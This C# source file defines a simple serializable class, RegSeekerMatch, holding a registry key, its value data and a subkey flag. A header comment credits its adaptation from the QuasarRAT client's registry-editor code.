using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace xClient.Core.Registry
{
    /*
     * Derived and Adapted By Justin Yanke
     * github: https://github.com/yankejustin
     * ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     * This code is created by Justin Yanke and has only been
     * modified partially.
     * ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     * Modified by StingRaptor on January 21, 2016
     * ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     * Original Source:
     * https://github.com/quasar/QuasarRAT/blob/regedit/Client/Core/Registry/RegSeekerMatch.cs
     */

    [Serializable]
    public class RegSeekerMatch
    {
        public string Key { get; private set; }
        public List<RegValueData> Data { get; private set; }
        public bool HasSubKeys { get; private set; }

        public RegSeekerMatch(string key, List<RegValueData> data, int subkeycount)
        {
            Key = key;
            Data = data;
            HasSubKeys = (subkeycount > 0);
        }

        public override string ToString()
        {
            return string.Format("({0}:{1})", Key, Data.ToString());
        }
    }
}
